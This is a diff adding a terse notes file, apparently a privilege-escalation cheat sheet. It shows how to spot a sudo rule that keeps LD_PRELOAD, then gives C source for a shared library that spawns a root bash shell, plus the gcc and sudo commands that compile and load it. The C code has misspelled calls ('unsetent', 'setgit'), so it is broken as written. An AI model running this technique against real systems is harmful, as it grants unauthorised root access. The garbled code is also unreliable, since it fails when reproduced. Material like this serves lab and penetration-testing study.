@@ -1,0 +1,27 @@
+find out stuff
+
+sudo -l and you'll see something like...
+
+Matching Defaults entries for ... blah blah ....
+  env_reset, env_keep+=LD_PRELOAD
+
+bingo
+
+escalate by creating some c code, compiling it, and loading it
+
+vim shell.c or echo each line if you're in a pinch
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+  unsetent("LD_PRELOAD");
+  setgit(0);
+  setuid(0);
+  system("/bin/bash");
+}
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+sudo LD_PRELOAD=/path/to/the/compiled/shell.so apache2 (or another bin you are allowed in sudo -l)
